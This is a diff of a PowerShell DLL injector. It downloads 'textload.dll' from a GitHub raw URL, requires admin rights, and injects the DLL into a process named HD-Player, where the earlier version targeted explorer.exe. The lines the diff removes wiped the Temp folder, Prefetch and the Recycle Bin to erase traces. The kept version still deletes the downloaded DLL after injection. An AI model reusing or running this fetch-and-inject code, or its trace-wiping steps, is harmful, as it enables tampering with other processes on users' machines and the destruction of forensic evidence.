@@ -1,6 +1,6 @@
 # ================== CONFIG ===================== #
 $GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll"
-$processName = "explorer"  # Changed from HD-Player to explorer
+$processName = "HD-Player"  # Changed back to HD-Player
 $LocalDLL_Path = "$env:TEMP\textload.dll"
 # =============================================== #
 
@@ -17,24 +17,12 @@ if (-not (Test-Admin)) {
     exit
 }
 
-# Get explorer process
+# Get HD-Player process
 $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1
 
 if (-not $proc) {
-    Write-Host "[-] Process '$processName' not found. Trying to start it..."
-    try {
-        Start-Process $processName
-        Start-Sleep -Seconds 3
-        $proc = Get-Process -Name $processName -ErrorAction SilentlyContinue | Select-Object -First 1
-        if (-not $proc) {
-            Write-Host "[-] Failed to start explorer.exe"
-            exit
-        }
-    }
-    catch {
-        Write-Host "[-] Error starting explorer: $_"
-        exit
-    }
+    Write-Host "[-] Process '$processName' not found. Please make sure HD-Player is running."
+    exit
 }
 
 $TargetPID = $proc.Id
@@ -142,25 +130,12 @@ catch {
 
 # Perform injection
 try {
-    Write-Host "[*] Injecting DLL into explorer.exe..."
+    Write-Host "[*] Injecting DLL into HD-Player.exe..."
     [Injector]::Inject($TargetPID, $LocalDLL_Path)
-    Write-Host "✅ DLL injected successfully into explorer.exe!"
-    
-    # Refresh explorer to see changes
-    Write-Host "[*] Refreshing explorer..."
-    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
-    Start-Process explorer
+    Write-Host "✅ DLL injected successfully into HD-Player.exe!"
 }
 catch {
     Write-Host "[-] Injection failed: $_"
-    # Try to restart explorer if injection failed
-    try {
-        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
-        Start-Process explorer
-    }
-    catch {
-        Write-Host "[!] Failed to restart explorer: $_"
-    }
 }
 
 # Cleaning section
@@ -170,23 +145,6 @@ try {
         Remove-Item $LocalDLL_Path -Force -ErrorAction SilentlyContinue
         Write-Host "[+] Temporary DLL removed"
     }
-    
-    # Clear Temp
-    Get-ChildItem -Path $env:TEMP -Force | Where-Object { $_.Name -ne $null } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
-    Write-Host "[+] Temp folder cleared"
-    
-    # Clear Prefetch
-    try {
-        Get-ChildItem -Path "$env:SYSTEMROOT\Prefetch" -Force -ErrorAction Stop | Remove-Item -Force -ErrorAction SilentlyContinue
-        Write-Host "[+] Prefetch cleared"
-    } catch { Write-Host "[*] Couldn't clear Prefetch (normal if not admin)" }
-    
-    # Empty Recycle Bin
-    try {
-        $recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)
-        $recycleBin.Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue }
-        Write-Host "[+] Recycle Bin emptied"
-    } catch { Write-Host "[-] Error emptying Recycle Bin: $_" }
 }
 catch {
     Write-Host "[-] Cleanup error: $_"
